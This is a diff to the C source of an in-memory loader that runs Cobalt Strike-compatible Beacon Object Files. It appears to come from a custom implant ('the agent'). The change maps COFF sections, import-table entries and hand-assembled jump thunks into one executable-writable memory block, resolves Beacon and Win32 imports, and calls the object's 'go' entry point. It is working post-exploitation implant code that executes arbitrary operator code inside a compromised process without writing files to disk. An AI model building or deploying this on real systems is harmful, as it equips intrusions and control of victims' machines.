@@ -6,8 +6,9 @@
  * Loads and executes COFF .obj files in-memory, compatible with
  * Cobalt Strike's BOF format and BeaconAPI.
  *
- * COFF sections are mapped, relocations applied, external symbols
- * resolved against BeaconAPI + Win32, then the entry point "go" is called.
+ * All code sections, thunks, and IAT entries are allocated in a single
+ * contiguous VirtualAlloc block so that REL32 relocations never overflow
+ * on x86_64 (the entire block is well under 2 GB).
  */
 
 #include <windows.h>
@@ -71,7 +72,6 @@ typedef struct {
 #define IMAGE_REL_AMD64_REL32_4  0x0008
 #define IMAGE_REL_AMD64_REL32_5  0x0009
 
-/* COFF symbol storage classes (use system defs if available) */
 #ifndef IMAGE_SYM_CLASS_EXTERNAL
 #define IMAGE_SYM_CLASS_EXTERNAL        2
 #endif
@@ -241,27 +241,28 @@ static const bof_api_entry g_beacon_api[] = {
     { NULL, NULL }
 };
 
-/* Resolve a BOF import: __imp_BEACON$FuncName or __imp_LIBRARY$FuncName */
+/* Resolve a BOF import: BeaconFuncName or LIBRARY$FuncName */
 static PVOID resolve_bof_import(const char *name) {
-    /* Check BeaconAPI first */
     for (int i = 0; g_beacon_api[i].name; i++) {
         if (strcmp(name, g_beacon_api[i].name) == 0)
             return g_beacon_api[i].addr;
     }
 
-    /* CS BOF convention: __imp_Library$Function */
+    /* CS BOF convention: Library$Function */
     const char *dollar = strchr(name, '$');
     if (!dollar) {
-        /* Try as a direct Win32 import: __imp_FunctionName */
         PVOID addr = (PVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), name);
         if (addr) return addr;
         addr = (PVOID)GetProcAddress(GetModuleHandleA("ntdll.dll"), name);
         if (addr) return addr;
         addr = (PVOID)GetProcAddress(GetModuleHandleA("user32.dll"), name);
+        if (addr) return addr;
+        addr = (PVOID)GetProcAddress(GetModuleHandleA("advapi32.dll"), name);
+        if (addr) return addr;
+        addr = (PVOID)GetProcAddress(GetModuleHandleA("msvcrt.dll"), name);
         return addr;
     }
 
-    /* Split Library$Function */
     size_t libLen = (size_t)(dollar - name);
     char lib[128], func[256];
     if (libLen >= sizeof(lib)) return NULL;
@@ -270,7 +271,6 @@ static PVOID resolve_bof_import(const char *name) {
     strncpy(func, dollar + 1, sizeof(func) - 1);
     func[sizeof(func) - 1] = '\0';
 
-    /* Append .dll if needed */
     if (!strstr(lib, ".dll") && !strstr(lib, ".DLL")) {
         strncat(lib, ".dll", sizeof(lib) - strlen(lib) - 1);
     }
@@ -280,41 +280,6 @@ static PVOID resolve_bof_import(const char *name) {
     if (!hMod) return NULL;
 
     return (PVOID)GetProcAddress(hMod, func);
-}
-
-/* ── IAT allocation tracker (for leak-free cleanup) ──────── */
-
-typedef struct {
-    PVOID *entries;
-    int    count;
-    int    capacity;
-} iat_tracker;
-
-static void iat_tracker_init(iat_tracker *t) {
-    t->entries  = NULL;
-    t->count    = 0;
-    t->capacity = 0;
-}
-
-static BOOL iat_tracker_add(iat_tracker *t, PVOID ptr) {
-    if (t->count >= t->capacity) {
-        int newCap = t->capacity == 0 ? 32 : t->capacity * 2;
-        PVOID *newBuf = (PVOID *)realloc(t->entries, (size_t)newCap * sizeof(PVOID));
-        if (!newBuf) return FALSE;
-        t->entries  = newBuf;
-        t->capacity = newCap;
-    }
-    t->entries[t->count++] = ptr;
-    return TRUE;
-}
-
-static void iat_tracker_free(iat_tracker *t) {
-    for (int i = 0; i < t->count; i++)
-        VirtualFree(t->entries[i], 0, MEM_RELEASE);
-    free(t->entries);
-    t->entries  = NULL;
-    t->count    = 0;
-    t->capacity = 0;
 }
 
 /* ── COFF Loader ─────────────────────────────────────────── */
@@ -329,11 +294,16 @@ static const char *coff_symbol_name(COFF_SYMBOL *sym, const char *strTab) {
     return strTab + sym->Name.Long.Offset;
 }
 
+/* Thunk: mov rax, <64-bit addr>; jmp rax  =  12 bytes */
+#define THUNK_SIZE      12
+#define MAX_BOF_IMPORTS 512
+#define MAX_BOF_SECTIONS 64
+
 /*
  * bof_exec: Load and execute a COFF object file in-memory.
  *   bof_data / bof_len: raw .obj file bytes
  *   args / args_len: packed argument buffer (BeaconDataParse format)
- *   output / output_len: receives BOF output text
+ *   output / output_max / output_len: receives BOF output text
  * Returns 0 on success.
  */
 static int bof_exec(const unsigned char *bof_data, size_t bof_len,
@@ -346,29 +316,49 @@ static int bof_exec(const unsigned char *bof_data, size_t bof_len,
     g_bof_output[0] = '\0';
 
     COFF_FILE_HEADER *hdr = (COFF_FILE_HEADER *)bof_data;
+    int numSections = hdr->NumberOfSections;
+    if (numSections <= 0 || numSections > MAX_BOF_SECTIONS) return -1;
+
     COFF_SECTION *sections = (COFF_SECTION *)(bof_data + sizeof(COFF_FILE_HEADER));
-    COFF_SYMBOL *symTab = (COFF_SYMBOL *)(bof_data + hdr->PointerToSymbolTable);
-    const char *strTab = (const char *)(symTab + hdr->NumberOfSymbols);
+    COFF_SYMBOL  *symTab   = (COFF_SYMBOL *)(bof_data + hdr->PointerToSymbolTable);
+    const char   *strTab   = (const char *)(symTab + hdr->NumberOfSymbols);
 
-    /* Track IAT allocations for leak-free cleanup */
-    iat_tracker iat;
-    iat_tracker_init(&iat);
+    /* ─── Phase 1: Calculate total memory for one contiguous block ─── */
 
-    /* Allocate section memory */
-    PVOID *secMem = (PVOID *)calloc(hdr->NumberOfSections, sizeof(PVOID));
-    if (!secMem) return -1;
+    size_t secOffsets[MAX_BOF_SECTIONS];
+    size_t totalSize = 0;
 
-    for (int i = 0; i < hdr->NumberOfSections; i++) {
+    for (int i = 0; i < numSections; i++) {
+        secOffsets[i] = totalSize;
         DWORD sz = sections[i].SizeOfRawData;
         if (sz == 0) sz = sections[i].VirtualSize;
-        if (sz == 0) { secMem[i] = NULL; continue; }
+        if (sz == 0) { continue; }
+        totalSize += (sz + 0xFu) & ~(size_t)0xFu;
+    }
 
-        DWORD prot = PAGE_READWRITE;
-        if (sections[i].Characteristics & 0x20000000) /* IMAGE_SCN_MEM_EXECUTE */
-            prot = PAGE_EXECUTE_READWRITE;
+    size_t thunkAreaOff = totalSize;
+    totalSize += MAX_BOF_IMPORTS * THUNK_SIZE;
+    size_t iatAreaOff = totalSize;
+    totalSize += MAX_BOF_IMPORTS * sizeof(PVOID);
 
-        secMem[i] = VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, prot);
-        if (!secMem[i]) goto cleanup;
+    /* ─── Phase 2: Single allocation ─── */
+
+    BYTE *codeBlock = (BYTE *)VirtualAlloc(NULL, totalSize,
+                                           MEM_COMMIT | MEM_RESERVE,
+                                           PAGE_EXECUTE_READWRITE);
+    if (!codeBlock) return -1;
+
+    /* ─── Phase 3: Map sections into the block ─── */
+
+    PVOID secMem[MAX_BOF_SECTIONS];
+    memset(secMem, 0, sizeof(secMem));
+
+    for (int i = 0; i < numSections; i++) {
+        DWORD sz = sections[i].SizeOfRawData;
+        if (sz == 0) sz = sections[i].VirtualSize;
+        if (sz == 0) { continue; }
+
+        secMem[i] = codeBlock + secOffsets[i];
 
         if (sections[i].SizeOfRawData > 0 && sections[i].PointerToRawData > 0)
             memcpy(secMem[i], bof_data + sections[i].PointerToRawData, sections[i].SizeOfRawData);
@@ -376,8 +366,13 @@ static int bof_exec(const unsigned char *bof_data, size_t bof_len,
             memset(secMem[i], 0, sz);
     }
 
-    /* Process relocations */
-    for (int i = 0; i < hdr->NumberOfSections; i++) {
+    int thunkCount = 0;
+    int iatCount   = 0;
+    int loadOk     = 1;
+
+    /* ─── Phase 4: Process relocations ─── */
+
+    for (int i = 0; i < numSections; i++) {
         if (!secMem[i] || sections[i].NumberOfRelocations == 0) continue;
         COFF_RELOC *relocs = (COFF_RELOC *)(bof_data + sections[i].PointerToRelocations);
 
@@ -387,26 +382,53 @@ static int bof_exec(const unsigned char *bof_data, size_t bof_len,
             PVOID symAddr = NULL;
 
             if (sym->SectionNumber > 0) {
-                /* Internal symbol */
                 int secIdx = sym->SectionNumber - 1;
-                if (secIdx < hdr->NumberOfSections && secMem[secIdx])
+                if (secIdx < numSections && secMem[secIdx])
                     symAddr = (BYTE*)secMem[secIdx] + sym->Value;
-            } else if (sym->StorageClass == IMAGE_SYM_CLASS_EXTERNAL && sym->SectionNumber == 0) {
-                /* External import */
+            } else if (sym->StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
+                       sym->SectionNumber == 0) {
                 const char *importName = symName;
                 if (strncmp(importName, "__imp_", 6) == 0) importName += 6;
+
                 symAddr = resolve_bof_import(importName);
-                if (!symAddr) goto cleanup;
-                /* For __imp_ symbols, we need a pointer-to-function (IAT-style) */
+                if (!symAddr) {
+                    g_bof_output_len += (DWORD)snprintf(
+                        g_bof_output + g_bof_output_len,
+                        BOF_OUTPUT_SIZE - g_bof_output_len,
+                        "[BOF ERROR] Unresolved symbol: %s\n", symName);
+                    loadOk = 0;
+                    goto done;
+                }
+
                 if (strncmp(symName, "__imp_", 6) == 0) {
-                    PVOID *iatEntry = (PVOID *)VirtualAlloc(NULL, sizeof(PVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-                    if (!iatEntry) goto cleanup;
+                    /*
+                     * __imp_ symbol: create IAT entry (pointer-to-function).
+                     * The instruction is `call/mov [rip+disp32]` — indirect.
+                     * The IAT entry is inside codeBlock, so disp32 is safe.
+                     */
+                    if (iatCount >= MAX_BOF_IMPORTS) { loadOk = 0; goto done; }
+                    PVOID *iatEntry = (PVOID *)(codeBlock + iatAreaOff +
+                                                (size_t)iatCount * sizeof(PVOID));
                     *iatEntry = symAddr;
-                    if (!iat_tracker_add(&iat, iatEntry)) {
-                        VirtualFree(iatEntry, 0, MEM_RELEASE);
-                        goto cleanup;
-                    }
+                    iatCount++;
                     symAddr = iatEntry;
+                } else {
+                    /*
+                     * Plain extern symbol (no __imp_ prefix): direct `call rip+disp32`.
+                     * The target function may be in the EXE image (>2 GB away).
+                     * Create a trampoline thunk inside codeBlock:
+                     *   mov rax, <abs64>   ; 48 B8 <8 bytes>
+                     *   jmp rax            ; FF E0
+                     */
+                    if (thunkCount >= MAX_BOF_IMPORTS) { loadOk = 0; goto done; }
+                    BYTE *thunk = codeBlock + thunkAreaOff +
+                                  (size_t)thunkCount * THUNK_SIZE;
+                    thunk[0] = 0x48; thunk[1] = 0xB8;
+                    UINT64 target64 = (UINT64)(ULONG_PTR)symAddr;
+                    memcpy(thunk + 2, &target64, 8);
+                    thunk[10] = 0xFF; thunk[11] = 0xE0;
+                    thunkCount++;
+                    symAddr = thunk;
                 }
             }
 
@@ -443,8 +465,9 @@ static int bof_exec(const unsigned char *bof_data, size_t bof_len,
         }
     }
 
-    /* Find "go" entry point */
-    {
+    /* ─── Phase 5: Find and call "go" entry point ─── */
+
+    if (loadOk) {
         PVOID entryPoint = NULL;
         for (DWORD s = 0; s < hdr->NumberOfSymbols; s++) {
             const char *sn = coff_symbol_name(&symTab[s], strTab);
@@ -456,18 +479,20 @@ static int bof_exec(const unsigned char *bof_data, size_t bof_len,
             }
             s += symTab[s].NumberOfAuxSymbols;
         }
-        if (!entryPoint) goto cleanup;
 
-        /* Call entry: void go(char *args, int alen)
-         * Note: MinGW lacks __try/__except; a crashing BOF will terminate the agent.
-         * Use only trusted, tested BOFs. */
-        {
+        if (!entryPoint) {
+            g_bof_output_len += (DWORD)snprintf(
+                g_bof_output + g_bof_output_len,
+                BOF_OUTPUT_SIZE - g_bof_output_len,
+                "[BOF ERROR] Entry point 'go' not found\n");
+        } else {
             typedef void (*bof_entry_t)(char*, int);
             bof_entry_t entry = (bof_entry_t)entryPoint;
             entry((char*)args, (int)args_len);
         }
     }
 
+done:
     /* Copy output */
     if (output && output_max > 0) {
         DWORD copyLen = g_bof_output_len;
@@ -477,14 +502,8 @@ static int bof_exec(const unsigned char *bof_data, size_t bof_len,
         if (output_len) *output_len = copyLen;
     }
 
-    /* Cleanup */
-cleanup:
-    iat_tracker_free(&iat);
-    for (int i = 0; i < hdr->NumberOfSections; i++) {
-        if (secMem[i]) VirtualFree(secMem[i], 0, MEM_RELEASE);
-    }
-    free(secMem);
-    return (g_bof_output_len > 0 || 1) ? 0 : -1;
+    VirtualFree(codeBlock, 0, MEM_RELEASE);
+    return 0;
 }
 
 #endif /* APEX_BOF_H */
